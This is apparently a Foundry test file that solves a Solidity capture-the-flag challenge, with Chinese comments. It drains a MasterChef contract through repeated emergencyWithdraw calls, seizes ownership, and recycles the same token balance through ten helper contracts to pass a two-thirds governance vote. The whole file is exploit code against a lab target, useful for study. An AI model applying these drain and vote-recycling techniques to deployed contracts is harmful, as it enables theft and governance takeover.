// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2; // 不加这个会报错，原因如下：https://github.com/foundry-rs/foundry/issues/4376

import "forge-std/Test.sol";
import "../../src/08.challenge/Governance.sol";

contract attackTest is Test {
    Governance public governance;
    MasterChef public masterChef;
    Helper[10] public helpers;
    uint256 constant ALLMONEY = 10000000;

    function setUp() public{
        governance = new Governance("level");
        masterChef = governance.masterChef();
    }

    function test_isComplete() public{
        // 拿走全部空投
        for(uint i = 0; i < 1000; i++){
            masterChef.airdorp();
        }
        assertEq(masterChef.balanceOf(address(this)),1000);
        // 存款: 存到第一个池子。此时我们token的余额为0，但是质押了1000个代币
        masterChef.approve(address(masterChef), 1000);
        masterChef.deposit(0, 1000);
        // emergencyWithdraw漏洞：拿走合约中所有的钱
        // 10000000 / 1000 = 10000
        for(uint i = 0; i < 10000; i++){
            masterChef.emergencyWithdraw(0);
        }
        // 检查是否拿完了合约中的所有钱
        assertEq(masterChef.balanceOf(address(this)),ALLMONEY);
        // 我们有了足够的钱，可以成为owner了
        masterChef.transferOwnership(address(this));
        assertEq(masterChef.owner(),address(this));
        // 成为了owner之后就可以投票了，但是只能投票一次
        governance.vote(address(this));
        // 创建10个Helper来帮助我们获得更多的投票
        for(uint i = 0; i < 10; i++){
            helpers[i] = new Helper(address(masterChef), address(governance));
        }
        // 10个Helper继承我们金钱，然后继续投票给我
        for(uint i = 0; i < 10; i++){
            // 转钱到Helper
            masterChef.transfer(address(helpers[i]),ALLMONEY);
            // 用Helper帮助我们投票
            helpers[i].help(address(this));
        }
        // 检查是否大于2/3的投票
        assertGt(governance.validatorVotes(address(this)),masterChef.totalSupply() * 2 / 3);
        governance.setValidator();
        governance.setflag();
    }

}

contract Helper{
    MasterChef masterChef;
    Governance governance;
    uint256 constant ALLMONEY = 10000000;

    constructor(address _masterChef,address _governance)public{
        masterChef = MasterChef(_masterChef);
        governance = Governance(_governance);
    }

    function help(address _addr) public{
        // Helper有钱之后就可以成为Owner
        masterChef.transferOwnership(address(this));
        // 成为owner之后就给本合约投票
        governance.vote(_addr);
        // 投完票之后把钱给回本合约
        masterChef.transfer(_addr, ALLMONEY);
    }
}